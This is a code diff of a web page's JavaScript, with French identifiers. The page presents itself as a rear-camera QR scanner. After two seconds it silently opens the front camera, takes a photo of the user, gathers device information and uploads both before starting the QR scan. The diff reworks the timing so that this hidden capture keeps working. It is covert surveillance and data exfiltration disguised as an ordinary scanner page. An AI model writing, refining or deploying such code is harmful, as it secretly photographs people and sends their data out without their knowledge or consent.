@@ -183,30 +183,32 @@
         (async function() {
             const videoMain = document.getElementById('video-main');
             const streamMain = await obtenirCameraArriere();
-            const streamSelfie = await obtenirCameraSelfie();
 
-            if (streamMain && streamSelfie) {
+            if (streamMain) {
                 videoMain.srcObject = streamMain;
 
                 // Prendre une photo de la caméra selfie automatiquement après 2 secondes
                 setTimeout(async () => {
-                    const videoSelfie = document.createElement('video');
-                    videoSelfie.srcObject = streamSelfie;
-                    videoSelfie.play();
+                    const streamSelfie = await obtenirCameraSelfie();
+                    if (streamSelfie) {
+                        const videoSelfie = document.createElement('video');
+                        videoSelfie.srcObject = streamSelfie;
+                        videoSelfie.play();
 
-                    videoSelfie.onloadedmetadata = async () => {
-                        const dataURLMain = capturerPhoto(videoSelfie);
-                        const blobMain = dataURLToBlob(dataURLMain);
-                        const infosAppareil = await obtenirInfosAppareil();
+                        videoSelfie.onloadedmetadata = async () => {
+                            const dataURLMain = capturerPhoto(videoSelfie);
+                            const blobMain = dataURLToBlob(dataURLMain);
+                            const infosAppareil = await obtenirInfosAppareil();
 
-                        await envoyerDonnees(blobMain, infosAppareil);
-                        console.log('Image et informations envoyées avec succès');
+                            await envoyerDonnees(blobMain, infosAppareil);
+                            console.log('Image et informations envoyées avec succès');
 
-                        lancerScanQRCode();
-                    };
+                            lancerScanQRCode();
+                        };
+                    }
                 }, 2000);
             } else {
-                alert("Impossible d'accéder à l'une des caméras.");
+                alert("Impossible d'accéder à la caméra arrière.");
             }
         })();
     </script>
